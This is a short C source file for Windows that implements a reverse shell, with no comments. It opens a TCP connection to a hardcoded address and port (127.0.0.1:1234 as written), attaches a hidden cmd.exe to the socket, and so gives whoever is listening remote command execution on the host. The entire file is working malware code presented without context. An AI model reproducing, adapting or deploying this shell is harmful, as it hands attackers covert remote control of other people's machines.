#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <WS2tcpip.h>
#include <stdio.h>
#include <stdlib.h>

int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nShow) {
    WSADATA wsaData;
    SOCKET s1;
    struct sockaddr_in hax;

    char ip_addr[] = "127.0.0.1";
    short port = 1234;

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return EXIT_FAILURE;
    }

    s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    hax.sin_family = AF_INET;
    hax.sin_port = htons(port); 
    hax.sin_addr.s_addr = inet_addr(ip_addr);

    if (WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        WSACleanup();
        return EXIT_FAILURE;
    }

    SetHandleInformation((HANDLE)s1, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;

    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s1;
    si.wShowWindow = SW_HIDE;

    char cmd[] = "cmd.exe";
    CreateProcessA(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(s1);
    WSACleanup();

    return EXIT_SUCCESS;
}